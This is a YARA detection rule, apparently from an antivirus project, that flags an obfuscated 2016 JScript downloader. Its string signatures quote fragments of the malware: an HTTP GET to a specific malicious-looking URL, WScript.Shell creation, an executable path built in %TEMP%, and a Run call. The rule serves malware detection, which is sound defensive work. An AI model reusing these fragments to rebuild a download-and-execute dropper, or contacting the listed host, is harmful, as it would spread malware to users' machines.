rule sig_20160330_6d8504a7cfde76c0f844180dfff4868c {
  meta:
    description = "datamaliciousorder - file 20160330_6d8504a7cfde76c0f844180dfff4868c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5131ecc25a13a357823592064bcd07dd207999381143520135afafef64e173f4"

  strings:
    $s1  = "_YH[_SN](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _Z(_U0, _G0){_FJ = _FJ * 1; return _U0 - _G0;};" fullword ascii
    $s3  = "var _CK = function _IS() {return WScript[_R](\"WScript\"+\".Shell\");}(), _FM = 11;" fullword ascii
    $s4  = "if (_YH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _GR(){return _YD + \"\";};" fullword ascii
    $s6  = "function _NR() {return _CK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"6Fg1cj2XkApQUnu.ex\" + \"e\";};" fullword ascii
    $s7  = "function _U(_FZ){_CK[\"Run\"](_FZ, _FJ, _FJ);};" fullword ascii
    $s8  = "function _YW() {return ((_Y == true) && (_Y == _K)) ? 1 : _FJ;};" fullword ascii
    $s9  = "function _UT(){return _R;};" fullword ascii
    $s10 = "function _XK(){return 22;};" fullword ascii
    $s11 = "var _M = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_Q){" fullword ascii
    $s13 = "return _Z(_YV, _CL);" fullword ascii
    $s14 = "function _KW()" fullword ascii
    $s15 = "function _T(_GJ) {var _CN = (1, 2, 3, 4, 5, _GJ); return _CN;};" fullword ascii
    $s16 = "var _D = false;" fullword ascii
    $s17 = "var _Y = false;" fullword ascii
    $s18 = "_Y = true; " fullword ascii
    $s19 = "var _K = false;" fullword ascii
    $s20 = "_K = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}